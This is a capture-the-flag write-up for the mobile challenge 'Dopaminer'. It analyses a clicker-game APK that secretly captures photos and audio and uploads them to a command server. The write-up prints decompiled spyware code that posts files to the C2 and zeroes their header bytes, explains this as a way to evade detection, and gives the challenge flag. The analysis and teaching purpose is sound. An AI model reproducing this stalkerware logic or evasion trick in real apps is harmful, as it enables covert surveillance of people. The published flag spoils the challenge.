# Dopaminer

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | Rooted 2026 / CaliphAllabs     |
| Category    | mobile                         |
| Difficulty  | Medium                         |
| Points      | 472                            |
| Author      | Daysa                          |

## Description
>Encontré esta aplicación en TikTok y es espectacular. Desde ese momento el tiempo de uso de mi móvil se ha disparado. El consumo de la batería por algún motivo también... Pero vamos, una locura, me ha cambiado la vida.

## TL;DR
Android APK (Kotlin/Jetpack Compose) that simulates a gold mining clicker game. In reality it is **spyware**: when the user reaches 10 gold, it requests camera and microphone permissions, then every 30 seconds it captures a photo and records 5 seconds of audio, sending them to a C2. The exfiltrated files have their **first 3 bytes zeroed** to obfuscate the headers. The flag is fragmented across the photos and audio exfiltrated to the C2 server.

## Initial Analysis

### APK Reconnaissance
```
Package: com.example.dopaminer
debuggable: true
Kotlin/Jetpack Compose
Permissions: CAMERA, RECORD_AUDIO, FOREGROUND_SERVICE
```

### Main Components
- **MainActivity** → loads `MineScreen` (Composable)
- **MineScreen** → clicker game: tap to mine gold, buy pickaxe (50 gold), critical hit (100 gold)
- **BackgroundService** → the actual spyware, starts when gold > 10

### Malicious Behavior (BackgroundService)
```java
// Every 30 seconds:
// 1. Captures a photo with the camera
// 2. Records 5 seconds of audio with the microphone
// 3. Sends both to the C2 via multipart POST

URL url = new URL("http://dopaminer.challs.caliphallabs.com");

// Obfuscation: the first 3 bytes of each file are set to 0
if (j == 0) {
    int min = Math.min(3, read);
    for (int i = 0; i < min; i++) {
        bArr[i] = 0;  // Zeroing magic bytes
    }
}
```

## Vulnerability Identified
This is not an exploitation challenge but a **malware analysis** one. The app is stalkerware/spyware disguised as an innocent game.

### Vulnerability Type
- CWE-200: Exposure of Sensitive Information (photo/audio exfiltration)
- Malware analysis / Mobile forensics

## Solution Process

###  APK Decompilation
```bash
apktool d dopaminer.apk -o apk_decoded/
jadx -d jadx_out/ dopaminer.apk
```

JADX could not fully decompile `MineScreen` (Compose generates complex bytecode), but the smali and the rest of the code revealed the logic.

###  C2 Identification
The `BackgroundService` sends data to `http://dopaminer.challs.caliphallabs.com`. When accessing the server via browser, the exfiltrated files are visible:

```html
<title>M32C Server</title>
<h2>Received:</h2>
- 1.jpeg (photo)
- 2.jpeg (photo)
- 3.jpeg (photo)
- 4.3gp  (audio)
```

###  Downloading and restoring files
The exfiltrated files have their **first 3 bytes zeroed** by the `writeFileToMultipart` function. For JPEG images, the correct magic bytes are `FF D8 FF`:

```bash
# Download files from C2
curl -s -O http://dopaminer.challs.caliphallabs.com/uploads/1.jpeg
curl -s -O http://dopaminer.challs.caliphallabs.com/uploads/2.jpeg
curl -s -O http://dopaminer.challs.caliphallabs.com/uploads/3.jpeg
curl -s -O http://dopaminer.challs.caliphallabs.com/uploads/4.3gp

# Restore JPEG headers (FF D8 FF)
for f in 1.jpeg 2.jpeg 3.jpeg; do
    cp "$f" "fixed_$f"
    printf '\xff\xd8\xff' | dd of="fixed_$f" bs=1 count=3 conv=notrunc
done
```

The 3GP file doesn't need fixing because its first bytes (`00 00 00 1c`) are a size field that coincides with the zeroing.

###  Reading the fragmented flag

The 3 photos show pieces of paper with parts of the flag handwritten on them:

| Source | Content | Photo context |
|--------|---------|---------------|
| fixed_1.jpeg (2040x942) | `clctf{5pYw4r` | Paper on a table |
| fixed_2.jpeg (942x2040) | `3_c0rRu` | Paper next to a remote control |
| fixed_3.jpeg (942x2040) | `pT3D_` | Paper next to a Wii |
| 4.3gp (8.11s, AMR) | `D474_cL1cK3r}` | Spoken audio |

###  Assembling the flag

```
Image 1:  clctf{5pYw4r
Image 2:  3_c0rRu
Image 3:  pT3D_
Audio:    D474_cL1cK3r}
─────────────────────────
Complete: clctf{5pYw4r3_c0rRupT3D_D474_cL1cK3r}
```

Semantics: **Spyware Corrupted Data Clicker** — perfectly describes the app's behavior: a clicker (game) that acts as spyware and corrupts the exfiltrated data by zeroing the headers.

## Discarded Approaches
- **Searching for flag in strings/smali/resources of the APK:** No flag embedded in the binary
- **EXIF metadata from the images:** No useful data (the headers were corrupted anyway)
- **Steganography in the images:** Not applicable, the flag is visually written on pieces of paper

## Flag
```
clctf{5pYw4r3_c0rRupT3D_D474_cL1cK3r}
```

## Key Lessons
- Spyware apps disguise themselves as innocent games to avoid user suspicion
- The trick of zeroing the first 3 bytes is a real obfuscation technique to avoid detection by magic bytes in firewalls/DLP
- JPEG magic bytes (`FF D8 FF`) are essential for the file to be recognized as an image
- In mobile challenges, you need to analyze not just the APK but also **the C2 server** and the exfiltrated data
- The flag can be distributed across multiple media (images + audio) requiring multimodal analysis

## References
- JPEG magic bytes: `FF D8 FF`
- 3GP format: ISO 14496-12 (magic bytes are a size field, not fixed magic bytes)
- Android foreground services: https://developer.android.com/develop/background-work/services/foreground-services
- OWASP Mobile Security: https://owasp.org/www-project-mobile-top-10/
